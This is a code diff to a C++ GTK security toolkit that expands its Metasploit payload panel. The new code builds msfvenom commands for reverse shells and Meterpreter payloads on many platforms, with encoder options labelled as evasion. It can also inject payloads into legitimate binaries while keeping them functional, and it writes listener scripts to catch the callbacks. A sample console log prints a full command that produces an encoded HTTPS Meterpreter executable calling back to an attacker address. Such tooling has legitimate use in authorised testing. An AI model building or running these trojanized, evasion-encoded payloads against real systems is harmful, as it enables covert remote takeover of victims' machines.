@@ -244,6 +244,7 @@ private:
     Gtk::Box nmap_panel{Gtk::ORIENTATION_VERTICAL, 10};
     Gtk::ScrolledWindow dns_scroll;
     Gtk::Box dns_panel{Gtk::ORIENTATION_VERTICAL, 12};
+    Gtk::ScrolledWindow payload_scroll;
     Gtk::Box payload_panel{Gtk::ORIENTATION_VERTICAL, 12};
     Gtk::Box wordlist_panel{Gtk::ORIENTATION_VERTICAL, 12};
     Gtk::Box hash_panel{Gtk::ORIENTATION_VERTICAL, 12};
@@ -327,9 +328,16 @@ private:
     Gtk::Entry payload_lport_entry;
     Gtk::ComboBoxText payload_encoder_combo;
     Gtk::Entry payload_iterations_entry;
+    Gtk::Entry payload_badchars_entry;
+    Gtk::Entry payload_template_entry;
+    Gtk::Button payload_template_browse_btn{"Browse..."};
+    Gtk::CheckButton payload_template_keep_check{"Keep Execution (-k)"};
     Gtk::Entry payload_output_entry;
     Gtk::Button payload_browse_btn{"Browse..."};
-    Gtk::Button payload_run_btn{"Generate Payload"};
+    Gtk::Entry payload_cmd_preview_entry;
+    Gtk::Button payload_copy_cmd_btn{"📋 Copy Command"};
+    Gtk::Button payload_gen_handler_btn{"📜 Gen Handler (.rc)"};
+    Gtk::Button payload_run_btn{"▶ Generate Payload"};
 
     // --- Inputs for Crunch Wordlist ---
     Gtk::Entry wordlist_min_entry;
@@ -1195,26 +1203,41 @@ private:
     void build_payload_panel() {
         payload_panel.get_style_context()->add_class("tool-page");
 
-        Gtk::Label* header = Gtk::manage(new Gtk::Label("Metasploit Payload Generator"));
+        // Header
+        Gtk::Label* header = Gtk::manage(new Gtk::Label("Metasploit Payload & Reverse Shell Generator"));
         header->get_style_context()->add_class("form-header");
         header->set_xalign(0);
         payload_panel.pack_start(*header, Gtk::PACK_SHRINK);
 
-        // Platform
+        // Platform & Payload Selection
         Gtk::Box* os_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
         Gtk::Label* o_lbl = Gtk::manage(new Gtk::Label("Target Platform & Payload:"));
-        payload_os_combo.append("Windows x86 (windows/meterpreter/reverse_tcp -> .exe)");
-        payload_os_combo.append("Windows x64 (windows/x64/meterpreter/reverse_tcp -> .exe)");
-        payload_os_combo.append("Linux x86 (linux/x86/meterpreter/reverse_tcp -> .elf)");
-        payload_os_combo.append("Linux x64 (linux/x64/meterpreter/reverse_tcp -> .elf)");
-        payload_os_combo.append("macOS x64 (osx/x64/meterpreter_reverse_tcp -> .macho)");
-        payload_os_combo.append("macOS ARM64 (osx/aarch64/meterpreter_reverse_tcp -> .macho)");
-        payload_os_combo.append("Android (android/meterpreter/reverse_tcp -> .apk)");
-        payload_os_combo.append("iOS ARM64 (apple_ios/aarch64/meterpreter_reverse_tcp -> .macho)");
+        o_lbl->set_xalign(0);
+
+        payload_os_combo.append("Windows x64 - Encrypted HTTPS (windows/x64/meterpreter_reverse_https -> .exe)");
+        payload_os_combo.append("Windows x64 - Stageless Meterpreter (windows/x64/meterpreter_reverse_tcp -> .exe)");
+        payload_os_combo.append("Windows x64 - Staged Meterpreter (windows/x64/meterpreter/reverse_tcp -> .exe)");
+        payload_os_combo.append("Windows x64 - Command Shell (windows/x64/shell_reverse_tcp -> .exe)");
+        payload_os_combo.append("Windows x86 - Encrypted HTTPS (windows/meterpreter_reverse_https -> .exe)");
+        payload_os_combo.append("Windows x86 - Stageless Meterpreter (windows/meterpreter_reverse_tcp -> .exe)");
+        payload_os_combo.append("Windows x86 - Staged Meterpreter (windows/meterpreter/reverse_tcp -> .exe)");
+        payload_os_combo.append("Windows x86 - Command Shell (windows/shell_reverse_tcp -> .exe)");
+        payload_os_combo.append("Linux x64 - Stageless Meterpreter (linux/x64/meterpreter_reverse_tcp -> .elf)");
+        payload_os_combo.append("Linux x64 - Staged Meterpreter (linux/x64/meterpreter/reverse_tcp -> .elf)");
+        payload_os_combo.append("Linux x64 - Command Shell (linux/x64/shell_reverse_tcp -> .elf)");
+        payload_os_combo.append("Linux x86 - Staged Meterpreter (linux/x86/meterpreter/reverse_tcp -> .elf)");
+        payload_os_combo.append("Linux x86 - Command Shell (linux/x86/shell_reverse_tcp -> .elf)");
+        payload_os_combo.append("macOS Apple Silicon ARM64 (osx/aarch64/meterpreter_reverse_tcp -> .macho)");
+        payload_os_combo.append("macOS Intel x64 (osx/x64/meterpreter_reverse_tcp -> .macho)");
+        payload_os_combo.append("Android APK - Encrypted HTTPS (android/meterpreter_reverse_https -> .apk)");
+        payload_os_combo.append("Android APK - Meterpreter TCP (android/meterpreter/reverse_tcp -> .apk)");
         payload_os_combo.append("PHP Web Shell (php/meterpreter_reverse_tcp -> .php)");
         payload_os_combo.append("Python Shell (python/meterpreter_reverse_tcp -> .py)");
         payload_os_combo.append("Bash Unix Shell (cmd/unix/reverse_bash -> .sh)");
+        payload_os_combo.append("PowerShell Windows Shell (windows/x64/powershell_reverse_tcp -> .ps1)");
         payload_os_combo.set_active(0);
+        payload_os_combo.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::on_payload_os_changed));
+
         os_row->pack_start(*o_lbl, Gtk::PACK_SHRINK);
         os_row->pack_start(payload_os_combo, Gtk::PACK_EXPAND_WIDGET);
         payload_panel.pack_start(*os_row, Gtk::PACK_SHRINK);
@@ -1224,39 +1247,91 @@ private:
         Gtk::Label* lh_lbl = Gtk::manage(new Gtk::Label("LHOST (Attacker IP):"));
         net_row->pack_start(*lh_lbl, Gtk::PACK_SHRINK);
         net_row->pack_start(payload_lhost_combo, Gtk::PACK_EXPAND_WIDGET);
+        payload_lhost_combo.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::update_payload_command_preview));
 
-        payload_refresh_ip_btn.signal_clicked().connect(sigc::mem_fun(*this, &MainWindow::refresh_network_interfaces));
+        payload_refresh_ip_btn.signal_clicked().connect([this]() {
+            refresh_network_interfaces();
+            update_payload_command_preview();
+        });
         net_row->pack_start(payload_refresh_ip_btn, Gtk::PACK_SHRINK);
 
         Gtk::Label* lp_lbl = Gtk::manage(new Gtk::Label("LPORT:"));
         payload_lport_entry.set_text("4444");
         payload_lport_entry.set_width_chars(8);
+        payload_lport_entry.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::update_payload_command_preview));
         net_row->pack_start(*lp_lbl, Gtk::PACK_SHRINK);
         net_row->pack_start(payload_lport_entry, Gtk::PACK_SHRINK);
         payload_panel.pack_start(*net_row, Gtk::PACK_SHRINK);
 
-        // Encoder & Iterations
+        // Obfuscation, Encoders & Template Box
+        Gtk::Box* obf_box = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_VERTICAL, 8));
+        obf_box->get_style_context()->add_class("profile-card");
+        Gtk::Label* obf_lbl = Gtk::manage(new Gtk::Label("Evasion, Encoders & Template Injection"));
+        obf_lbl->get_style_context()->add_class("field-label");
+        obf_lbl->set_xalign(0);
+        obf_box->pack_start(*obf_lbl, Gtk::PACK_SHRINK);
+
+        // Row 1: Encoder, Iterations, Bad Characters
         Gtk::Box* enc_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
         Gtk::Label* enc_lbl = Gtk::manage(new Gtk::Label("Encoder:"));
-        payload_encoder_combo.append("None (Raw executable)");
+        payload_encoder_combo.append("None (Raw / Native)");
         payload_encoder_combo.append("x86/shikata_ga_nai (Polymorphic XOR)");
         payload_encoder_combo.append("x64/zutto_dekiru");
+        payload_encoder_combo.append("x86/xor_dynamic");
         payload_encoder_combo.append("cmd/powershell_base64");
         payload_encoder_combo.set_active(0);
-        enc_row->pack_start(*enc_lbl, Gtk::PACK_SHRINK);
-        enc_row->pack_start(payload_encoder_combo, Gtk::PACK_EXPAND_WIDGET);
+        payload_encoder_combo.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::update_payload_command_preview));
 
         Gtk::Label* iter_lbl = Gtk::manage(new Gtk::Label("Iterations:"));
         payload_iterations_entry.set_text("1");
-        payload_iterations_entry.set_width_chars(5);
+        payload_iterations_entry.set_width_chars(4);
+        payload_iterations_entry.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::update_payload_command_preview));
+
+        Gtk::Label* bad_lbl = Gtk::manage(new Gtk::Label("Bad Chars (-b):"));
+        payload_badchars_entry.set_placeholder_text(R"(e.g. \x00\x0a\x0d)");
+        payload_badchars_entry.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::update_payload_command_preview));
+
+        enc_row->pack_start(*enc_lbl, Gtk::PACK_SHRINK);
+        enc_row->pack_start(payload_encoder_combo, Gtk::PACK_EXPAND_WIDGET);
         enc_row->pack_start(*iter_lbl, Gtk::PACK_SHRINK);
         enc_row->pack_start(payload_iterations_entry, Gtk::PACK_SHRINK);
-        payload_panel.pack_start(*enc_row, Gtk::PACK_SHRINK);
+        enc_row->pack_start(*bad_lbl, Gtk::PACK_SHRINK);
+        enc_row->pack_start(payload_badchars_entry, Gtk::PACK_SHRINK);
+        obf_box->pack_start(*enc_row, Gtk::PACK_SHRINK);
+
+        // Row 2: Template Injection (-x) & Keep Execution (-k)
+        Gtk::Box* tmpl_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
+        Gtk::Label* tmpl_lbl = Gtk::manage(new Gtk::Label("Inject into Template (-x):"));
+        payload_template_entry.set_placeholder_text("Path to existing binary (e.g. /usr/bin/whois or calc.exe)");
+        payload_template_entry.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::update_payload_command_preview));
+
+        payload_template_browse_btn.signal_clicked().connect([this]() {
+            Gtk::FileChooserDialog dialog(*this, "Select Template Binary", Gtk::FILE_CHOOSER_ACTION_OPEN);
+            dialog.add_button("Cancel", Gtk::RESPONSE_CANCEL);
+            dialog.add_button("Select", Gtk::RESPONSE_OK);
+            if (dialog.run() == Gtk::RESPONSE_OK) {
+                payload_template_entry.set_text(dialog.get_filename());
+                update_payload_command_preview();
+            }
+        });
+
+        payload_template_keep_check.set_active(true);
+        payload_template_keep_check.signal_toggled().connect(sigc::mem_fun(*this, &MainWindow::update_payload_command_preview));
+
+        tmpl_row->pack_start(*tmpl_lbl, Gtk::PACK_SHRINK);
+        tmpl_row->pack_start(payload_template_entry, Gtk::PACK_EXPAND_WIDGET);
+        tmpl_row->pack_start(payload_template_browse_btn, Gtk::PACK_SHRINK);
+        tmpl_row->pack_start(payload_template_keep_check, Gtk::PACK_SHRINK);
+        obf_box->pack_start(*tmpl_row, Gtk::PACK_SHRINK);
+
+        payload_panel.pack_start(*obf_box, Gtk::PACK_SHRINK);
 
         // Output File
         Gtk::Box* out_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 10));
-        Gtk::Label* out_lbl = Gtk::manage(new Gtk::Label("Output File Path:"));
+        Gtk::Label* out_lbl = Gtk::manage(new Gtk::Label("Output File:"));
         payload_output_entry.set_text("payload.exe");
+        payload_output_entry.signal_changed().connect(sigc::mem_fun(*this, &MainWindow::update_payload_command_preview));
+
         payload_browse_btn.signal_clicked().connect([this]() {
             Gtk::FileChooserDialog dialog(*this, "Save Payload As", Gtk::FILE_CHOOSER_ACTION_SAVE);
             dialog.add_button("Cancel", Gtk::RESPONSE_CANCEL);
@@ -1264,6 +1339,7 @@ private:
             dialog.set_current_name(payload_output_entry.get_text());
             if (dialog.run() == Gtk::RESPONSE_OK) {
                 payload_output_entry.set_text(dialog.get_filename());
+                update_payload_command_preview();
             }
         });
         out_row->pack_start(*out_lbl, Gtk::PACK_SHRINK);
@@ -1271,11 +1347,161 @@ private:
         out_row->pack_start(payload_browse_btn, Gtk::PACK_SHRINK);
         payload_panel.pack_start(*out_row, Gtk::PACK_SHRINK);
 
+        // Live Command Preview & Action Bar
+        Gtk::Box* cmd_row = Gtk::manage(new Gtk::Box(Gtk::ORIENTATION_HORIZONTAL, 8));
+        Gtk::Label* cmd_lbl = Gtk::manage(new Gtk::Label("Live Command:"));
+        payload_cmd_preview_entry.set_editable(false);
+        payload_cmd_preview_entry.get_style_context()->add_class("console-view");
+
+        payload_copy_cmd_btn.signal_clicked().connect([this]() {
+            auto cb = Gtk::Clipboard::get_for_display(get_display());
+            cb->set_text(payload_cmd_preview_entry.get_text());
+            append_console_output("[✓] Command copied to clipboard: " + payload_cmd_preview_entry.get_text() + "\n");
+        });
+
+        payload_gen_handler_btn.signal_clicked().connect(sigc::mem_fun(*this, &MainWindow::on_generate_handler_script));
+
         payload_run_btn.get_style_context()->add_class("action-btn");
         payload_run_btn.signal_clicked().connect(sigc::mem_fun(*this, &MainWindow::on_run_payload_generator));
-        payload_panel.pack_start(payload_run_btn, Gtk::PACK_SHRINK);
 
-        stack.add(payload_panel, "payload_page", "💣 Payload Generator");
+        cmd_row->pack_start(*cmd_lbl, Gtk::PACK_SHRINK);
+        cmd_row->pack_start(payload_cmd_preview_entry, Gtk::PACK_EXPAND_WIDGET);
+        cmd_row->pack_start(payload_copy_cmd_btn, Gtk::PACK_SHRINK);
+        cmd_row->pack_start(payload_gen_handler_btn, Gtk::PACK_SHRINK);
+        cmd_row->pack_start(payload_run_btn, Gtk::PACK_SHRINK);
+        payload_panel.pack_start(*cmd_row, Gtk::PACK_SHRINK);
+
+        update_payload_command_preview();
+
+        payload_scroll.set_policy(Gtk::POLICY_NEVER, Gtk::POLICY_AUTOMATIC);
+        payload_scroll.add(payload_panel);
+        stack.add(payload_scroll, "payload_page", "💣 Payload Generator");
+    }
+
+    std::pair<std::string, std::string> get_selected_payload_info() {
+        std::string choice = payload_os_combo.get_active_text();
+        if (choice.find("windows/x64/meterpreter_reverse_https") != std::string::npos) {
+            return {"windows/x64/meterpreter_reverse_https", "exe"};
+        } else if (choice.find("windows/x64/meterpreter_reverse_tcp") != std::string::npos) {
+            return {"windows/x64/meterpreter_reverse_tcp", "exe"};
+        } else if (choice.find("windows/x64/meterpreter/reverse_tcp") != std::string::npos) {
+            return {"windows/x64/meterpreter/reverse_tcp", "exe"};
+        } else if (choice.find("windows/x64/shell_reverse_tcp") != std::string::npos) {
+            return {"windows/x64/shell_reverse_tcp", "exe"};
+        } else if (choice.find("windows/meterpreter_reverse_https") != std::string::npos) {
+            return {"windows/meterpreter_reverse_https", "exe"};
+        } else if (choice.find("windows/meterpreter_reverse_tcp") != std::string::npos) {
+            return {"windows/meterpreter_reverse_tcp", "exe"};
+        } else if (choice.find("windows/meterpreter/reverse_tcp") != std::string::npos) {
+            return {"windows/meterpreter/reverse_tcp", "exe"};
+        } else if (choice.find("windows/shell_reverse_tcp") != std::string::npos) {
+            return {"windows/shell_reverse_tcp", "exe"};
+        } else if (choice.find("linux/x64/meterpreter_reverse_tcp") != std::string::npos) {
+            return {"linux/x64/meterpreter_reverse_tcp", "elf"};
+        } else if (choice.find("linux/x64/meterpreter/reverse_tcp") != std::string::npos) {
+            return {"linux/x64/meterpreter/reverse_tcp", "elf"};
+        } else if (choice.find("linux/x64/shell_reverse_tcp") != std::string::npos) {
+            return {"linux/x64/shell_reverse_tcp", "elf"};
+        } else if (choice.find("linux/x86/meterpreter/reverse_tcp") != std::string::npos) {
+            return {"linux/x86/meterpreter/reverse_tcp", "elf"};
+        } else if (choice.find("linux/x86/shell_reverse_tcp") != std::string::npos) {
+            return {"linux/x86/shell_reverse_tcp", "elf"};
+        } else if (choice.find("osx/aarch64/meterpreter_reverse_tcp") != std::string::npos) {
+            return {"osx/aarch64/meterpreter_reverse_tcp", "macho"};
+        } else if (choice.find("osx/x64/meterpreter_reverse_tcp") != std::string::npos) {
+            return {"osx/x64/meterpreter_reverse_tcp", "macho"};
+        } else if (choice.find("android/meterpreter_reverse_https") != std::string::npos) {
+            return {"android/meterpreter_reverse_https", "apk"};
+        } else if (choice.find("android/meterpreter/reverse_tcp") != std::string::npos) {
+            return {"android/meterpreter/reverse_tcp", "apk"};
+        } else if (choice.find("php/meterpreter_reverse_tcp") != std::string::npos) {
+            return {"php/meterpreter_reverse_tcp", "raw"};
+        } else if (choice.find("python/meterpreter_reverse_tcp") != std::string::npos) {
+            return {"python/meterpreter_reverse_tcp", "raw"};
+        } else if (choice.find("cmd/unix/reverse_bash") != std::string::npos) {
+            return {"cmd/unix/reverse_bash", "raw"};
+        } else if (choice.find("windows/x64/powershell_reverse_tcp") != std::string::npos) {
+            return {"windows/x64/powershell_reverse_tcp", "ps1"};
+        }
+        return {"windows/x64/meterpreter_reverse_tcp", "exe"};
+    }
+
+    void on_payload_os_changed() {
+        auto [name, fmt] = get_selected_payload_info();
+        std::string ext = fmt;
+        if (fmt == "raw") {
+            if (name.find("php") != std::string::npos) ext = "php";
+            else if (name.find("python") != std::string::npos) ext = "py";
+            else if (name.find("bash") != std::string::npos) ext = "sh";
+        }
+        payload_output_entry.set_text("payload." + ext);
+        update_payload_command_preview();
+    }
+
+    std::vector<std::string> build_payload_args() {
+        std::string lhost = payload_lhost_combo.get_active_id();
+        if (lhost.empty()) lhost = payload_lhost_combo.get_active_text();
+        if (lhost.empty()) lhost = "127.0.0.1";
+
+        std::string lport = payload_lport_entry.get_text();
+        if (lport.empty()) lport = "4444";
+
+        std::string out_file = payload_output_entry.get_text();
+        if (out_file.empty()) out_file = "payload.bin";
+
+        auto [payload_name, format] = get_selected_payload_info();
+
+        std::vector<std::string> args = {
+            "msfvenom",
+            "-p", payload_name,
+            "LHOST=" + lhost,
+            "LPORT=" + lport,
+            "-f", format,
+            "-o", out_file
+        };
+
+        std::string encoder = payload_encoder_combo.get_active_text();
+        if (encoder.rfind("None", 0) != 0) {
+            std::string enc_name;
+            if (encoder.find("x86/shikata_ga_nai") != std::string::npos) enc_name = "x86/shikata_ga_nai";
+            else if (encoder.find("x64/zutto_dekiru") != std::string::npos) enc_name = "x64/zutto_dekiru";
+            else if (encoder.find("x86/xor_dynamic") != std::string::npos) enc_name = "x86/xor_dynamic";
+            else if (encoder.find("cmd/powershell_base64") != std::string::npos) enc_name = "cmd/powershell_base64";
+
+            if (!enc_name.empty()) {
+                args.push_back("-e");
+                args.push_back(enc_name);
+                std::string iters = payload_iterations_entry.get_text();
+                if (!iters.empty() && std::all_of(iters.begin(), iters.end(), ::isdigit)) {
+                    args.push_back("-i");
+                    args.push_back(iters);
+                }
+            }
+        }
+
+        std::string badchars = payload_badchars_entry.get_text();
+        if (!badchars.empty()) {
+            args.push_back("-b");
+            args.push_back(badchars);
+        }
+
+        std::string tmpl = payload_template_entry.get_text();
+        if (!tmpl.empty()) {
+            args.push_back("-x");
+            args.push_back(tmpl);
+            if (payload_template_keep_check.get_active()) {
+                args.push_back("-k");
+            }
+        }
+
+        return args;
+    }
+
+    void update_payload_command_preview() {
+        auto args = build_payload_args();
+        std::string full_cmd;
+        for (const auto& a : args) full_cmd += a + " ";
+        payload_cmd_preview_entry.set_text(full_cmd);
     }
 
     // --- Page 5: Wordlist Generator (Crunch) ---
@@ -1632,6 +1858,7 @@ private:
         nmap_run_btn.set_sensitive(sensitive);
         dns_run_btn.set_sensitive(sensitive);
         payload_run_btn.set_sensitive(sensitive);
+        payload_gen_handler_btn.set_sensitive(sensitive);
         wordlist_run_btn.set_sensitive(sensitive);
     }
 
@@ -1768,11 +1995,8 @@ private:
 
     void on_run_payload_generator() {
         std::string lhost = payload_lhost_combo.get_active_id();
-        if (lhost.empty()) {
-            lhost = payload_lhost_combo.get_active_text();
-        }
+        if (lhost.empty()) lhost = payload_lhost_combo.get_active_text();
         std::string lport = payload_lport_entry.get_text();
-        std::string out_file = payload_output_entry.get_text();
 
         if (lhost.empty() || !SecurityUtils::is_valid_target(lhost)) {
             Gtk::MessageDialog dlg(*this, "Please select or provide a valid LHOST address.", false, Gtk::MESSAGE_ERROR);
@@ -1784,77 +2008,58 @@ private:
             dlg.run();
             return;
         }
-        if (out_file.empty()) {
-            out_file = "payload.bin";
-        }
 
-        std::string os_choice = payload_os_combo.get_active_text();
-        std::string payload_name;
-        std::string format;
-
-        if (os_choice.rfind("Windows x86", 0) == 0) {
-            payload_name = "windows/meterpreter/reverse_tcp";
-            format = "exe";
-        } else if (os_choice.rfind("Windows x64", 0) == 0) {
-            payload_name = "windows/x64/meterpreter/reverse_tcp";
-            format = "exe";
-        } else if (os_choice.rfind("Linux x86", 0) == 0) {
-            payload_name = "linux/x86/meterpreter/reverse_tcp";
-            format = "elf";
-        } else if (os_choice.rfind("Linux x64", 0) == 0) {
-            payload_name = "linux/x64/meterpreter/reverse_tcp";
-            format = "elf";
-        } else if (os_choice.rfind("macOS x64", 0) == 0) {
-            payload_name = "osx/x64/meterpreter_reverse_tcp";
-            format = "macho";
-        } else if (os_choice.rfind("macOS ARM64", 0) == 0) {
-            payload_name = "osx/aarch64/meterpreter_reverse_tcp";
-            format = "macho";
-        } else if (os_choice.rfind("Android", 0) == 0) {
-            payload_name = "android/meterpreter/reverse_tcp";
-            format = "apk";
-        } else if (os_choice.rfind("iOS", 0) == 0) {
-            payload_name = "apple_ios/aarch64/meterpreter_reverse_tcp";
-            format = "macho";
-        } else if (os_choice.rfind("PHP", 0) == 0) {
-            payload_name = "php/meterpreter_reverse_tcp";
-            format = "raw";
-        } else if (os_choice.rfind("Python", 0) == 0) {
-            payload_name = "python/meterpreter_reverse_tcp";
-            format = "raw";
-        } else if (os_choice.rfind("Bash", 0) == 0) {
-            payload_name = "cmd/unix/reverse_bash";
-            format = "raw";
-        }
-
-        std::vector<std::string> args = {
-            "msfvenom",
-            "-p", payload_name,
-            "LHOST=" + lhost,
-            "LPORT=" + lport,
-            "-f", format,
-            "-o", out_file
-        };
-
-        std::string encoder_choice = payload_encoder_combo.get_active_text();
-        if (encoder_choice.rfind("x86/shikata_ga_nai", 0) == 0) {
-            args.push_back("-e");
-            args.push_back("x86/shikata_ga_nai");
-        } else if (encoder_choice.rfind("x64/zutto_dekiru", 0) == 0) {
-            args.push_back("-e");
-            args.push_back("x64/zutto_dekiru");
-        } else if (encoder_choice.rfind("cmd/powershell_base64", 0) == 0) {
-            args.push_back("-e");
-            args.push_back("cmd/powershell_base64");
-        }
-
-        std::string iters = payload_iterations_entry.get_text();
-        if (!iters.empty() && std::all_of(iters.begin(), iters.end(), ::isdigit) && iters != "1") {
-            args.push_back("-i");
-            args.push_back(iters);
-        }
-
+        auto args = build_payload_args();
         execute_command_async("Metasploit Payload Generation", args);
+    }
+
+    void on_generate_handler_script() {
+        std::string lhost = payload_lhost_combo.get_active_id();
+        if (lhost.empty()) lhost = payload_lhost_combo.get_active_text();
+        std::string lport = payload_lport_entry.get_text();
+        if (lhost.empty() || !SecurityUtils::is_valid_target(lhost)) {
+            Gtk::MessageDialog dlg(*this, "Please select or provide a valid LHOST address.", false, Gtk::MESSAGE_ERROR);
+            dlg.run();
+            return;
+        }
+        if (!SecurityUtils::is_valid_port_str(lport)) {
+            Gtk::MessageDialog dlg(*this, "Please enter a valid LPORT (1 - 65535).", false, Gtk::MESSAGE_ERROR);
+            dlg.run();
+            return;
+        }
+
+        auto [payload_name, format] = get_selected_payload_info();
+
+        std::string rc_filename = "handler_" + lport + ".rc";
+        std::ofstream rc_file(rc_filename);
+        if (!rc_file.is_open()) {
+            Gtk::MessageDialog dlg(*this, "Failed to write handler resource file.", false, Gtk::MESSAGE_ERROR);
+            dlg.run();
+            return;
+        }
+
+        rc_file << "use exploit/multi/handler\n";
+        rc_file << "set PAYLOAD " << payload_name << "\n";
+        rc_file << "set LHOST " << lhost << "\n";
+        rc_file << "set LPORT " << lport << "\n";
+        rc_file << "set ExitOnSession false\n";
+        rc_file << "exploit -j -z\n";
+        rc_file.close();
+
+        std::string launch_cmd = "msfconsole -q -r " + rc_filename;
+        auto cb = Gtk::Clipboard::get_for_display(get_display());
+        cb->set_text(launch_cmd);
+
+        append_console_output("\n╔═════════════════════════════════════════════════════════════════════════════╗\n");
+        append_console_output("║            METASPLOIT MULTI/HANDLER LISTENER SCRIPT GENERATED               ║\n");
+        append_console_output("╚═════════════════════════════════════════════════════════════════════════════╝\n");
+        append_console_output("[✓] Script written: " + rc_filename + "\n");
+        append_console_output("[*] Configuration parameters:\n");
+        append_console_output("    Payload : " + payload_name + "\n");
+        append_console_output("    LHOST   : " + lhost + "\n");
+        append_console_output("    LPORT   : " + lport + "\n\n");
+        append_console_output("[*] Start listener anytime with:\n    " + launch_cmd + "\n");
+        append_console_output("[✓] Listener launch command automatically copied to clipboard!\n\n");
     }
 
     void on_run_wordlist_generator() {
@@ -2079,24 +2284,27 @@ public:
         save_snap("dns_page", "02_dns_recon.png");
 
         // 3. Payload Generator
-        payload_os_combo.set_active(1); // Windows x64
+        payload_os_combo.set_active(0); // Windows x64 Encrypted HTTPS
         payload_lport_entry.set_text("4444");
-        payload_encoder_combo.set_active(1);
+        payload_encoder_combo.set_active(1); // x86/shikata_ga_nai
         payload_iterations_entry.set_text("2");
-        payload_output_entry.set_text("reverse_tcp_x64.exe");
+        payload_badchars_entry.set_text(R"(\x00\x0a\x0d)");
+        payload_output_entry.set_text("payload_https_x64.exe");
+        update_payload_command_preview();
+
         console_buffer->set_text(
             "[▶] Starting task: Metasploit Payload Generation\n"
-            "[*] Executing: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.88.7 LPORT=4444 -f exe -o reverse_tcp_x64.exe -e x86/shikata_ga_nai -i 2\n\n"
+            "[*] Executing: msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.88.7 LPORT=4444 -f exe -o payload_https_x64.exe -e x86/shikata_ga_nai -i 2 -b \\x00\\x0a\\x0d\n\n"
             "[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n"
             "[-] No arch selected, selecting arch: x64 from the payload\n"
             "Found 1 compatible encoders\n"
             "Attempting to encode payload with 2 iterations of x86/shikata_ga_nai\n"
-            "x86/shikata_ga_nai succeeded with size 548 (iteration=0)\n"
-            "x86/shikata_ga_nai succeeded with size 575 (iteration=1)\n"
-            "x86/shikata_ga_nai filename = reverse_tcp_x64.exe\n"
-            "Payload size: 575 bytes\n"
-            "Final size of exe file: 7168 bytes\n"
-            "Saved as: reverse_tcp_x64.exe\n\n"
+            "x86/shikata_ga_nai succeeded with size 742 (iteration=0)\n"
+            "x86/shikata_ga_nai succeeded with size 769 (iteration=1)\n"
+            "x86/shikata_ga_nai filename = payload_https_x64.exe\n"
+            "Payload size: 769 bytes\n"
+            "Final size of exe file: 8192 bytes\n"
+            "Saved as: payload_https_x64.exe\n\n"
             "[✓] Task finished: Metasploit Payload Generation\n"
             "─────────────────────────────────────────────────────────────────────────────\n"
         );
